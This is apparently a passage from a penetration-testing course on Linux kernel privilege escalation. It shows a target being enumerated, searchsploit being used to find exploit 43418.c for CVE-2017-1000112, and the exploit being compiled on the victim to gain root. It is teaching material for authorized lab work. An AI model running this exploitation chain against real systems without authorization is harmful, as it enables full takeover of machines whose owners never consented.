### CVE-2017-1000112 

Kernel exploits are an excellent way to escalate privileges, but success may depend on matching not only the target's kernel version but also the operating system flavor, including Debian, Redhat, Gentoo, etc.

To demonstrate this attack vector, we will first gather information about our target by inspecting the /etc/issue file. As discussed earlier in the module, this is a system text file that contains a message or system identification to be printed before the login prompt on Linux machines.

```
n00b@victim:~$ cat /etc/issue
Ubuntu 16.04.3 LTS \n \l
```

Next, we will inspect the kernel version and system architecture using standard system commands:

```
n00b@victim:~$ uname -r 
4.8.0-58-generic
n00b@victim:~$ arch 
x86_64
```

Our target system appears to be running Ubuntu 16.04.3 LTS (kernel 4.8.0-58-generic) on the x86_64 architecture. Armed with this information, we can use searchsploit on our local Kali system to find kernel exploits matching the target version.

```
kali@kali:~$ searchsploit linux kernel ubuntu 16.04
-------------------------------------------------------- -----------------------------
 Exploit Title                                          |  Path (/usr/share/exploitdb/
-------------------------------------------------------- -----------------------------
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04 | exploits/linux_x86-64/local/
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.0 | exploits/linux_x86/local/422
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow  | exploits/linux/dos/39773.txt
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege | exploits/linux/local/40759.r
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PA | exploits/linux_x86-64/local/
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ta | exploits/linux_x86-64/local/
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' b  | exploits/linux/local/39772.t
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPL | exploits/linux/local/40489.t
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.0 | exploits/linux/local/43418.c
---------------------------------------------------------- ---------------------------
```

The last exploit (exploits/linux/local/43418.c) seems to directly correspond to the kernel version that our target is running. We will attempt to elevate our privileges by running this exploit on the target.

#### Compiling C/C++ Code on Linux

We'll use gcc on Linux to compile our exploit. Keep in mind that when compiling code, we must match the architecture of our target. This is especially important in situations where the target machine does not have a compiler and we are forced to compile the exploit on our attacking machine or a sandboxed environment that replicates the target OS and architecture.

In this example, we are fortunate that the target machine has a working compiler, but this is rare in the field.

Let's copy the exploit file to the target and compile it, passing only the source code file and -o to specify the output filename (exploit):

```
n00b@victim:~$ gcc 43418.c -o exploit
n00b@victim:~$ ls -lah exploit
total 36K
-rwxr-xr-x  1 kali kali  28K Jan 27 04:04 exploit
```

After compiling the exploit on our target machine, we can run it and use whoami to check our privilege level:

![Figure 19: Elevating privileges on Linux through a privilege escalation exploit](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/privilege_escalation/945a6d9d4f1f490ae9a752f9570d5e73-privilege_escalation_11.png)

Above image shows that our privileges were successfully elevated from n00b (standard user) to root, the highest privilege account on Linux operating systems.